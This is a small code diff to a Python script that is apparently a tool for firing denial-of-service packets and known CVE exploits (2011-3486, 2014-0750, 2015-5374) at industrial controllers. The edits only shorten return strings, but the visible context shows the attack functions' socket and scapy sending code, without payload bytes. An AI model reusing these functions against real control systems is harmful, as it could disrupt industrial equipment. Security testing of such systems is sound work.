@@ -20,7 +20,7 @@ def plc_status_check(target):
             status = "Broken"
         pass
     except ConnectionException:
-        status = "No connection to target"
+        status = "No connection"
         pass
     except(ModbusIOException, ParameterException, ModbusException, InvalidMessageReceivedException,
            MessageRegisterException, NoSuchSlaveException, NotImplementedException):
@@ -82,14 +82,14 @@ def dos_syn(target):
     dst_port = (1, 3000)
     src_port = RandShort()
     sr1(IP(dst=target) / TCP(sport=src_port, dport=dst_port), timeout=1, verbose=0)
-    return "..."
+    return ""
 
 
 def dos_xmas(target):
     dst_port = (1, 3000)
     src_port = RandShort()
     sr1(IP(dst=target) / TCP(sport=src_port, dport=dst_port, flags="FPU"), timeout=1, verbose=0)
-    return "..."
+    return ""
 
 
 def malware_eicar(target):
@@ -104,7 +104,7 @@ def malware_eicar(target):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.sendto(payload, (target, 1234))
     sock.close()
-    return "..."
+    return ""
 
 
 def malware_passwd(target):
@@ -118,7 +118,7 @@ def malware_passwd(target):
     else:
         sock.send(payload)
         sock.close()
-        status = "..."
+        status = ""
     return status
 
 
@@ -127,7 +127,7 @@ def cve_2015_5374(target):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.sendto(payload, (target, 50000))
     sock.close()
-    return "..."
+    return ""
 
 
 def cve_2014_0750(target):
@@ -146,7 +146,7 @@ def cve_2014_0750(target):
     else:
         sock.send(payload)
         sock.close()
-        status = "..."
+        status = ""
     return status
 
 
@@ -155,7 +155,7 @@ def cve_2011_3486(target):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.sendto(payload, (target, 48899))
     sock.close()
-    return "..."
+    return ""
 
 
 if __name__ == '__main__':
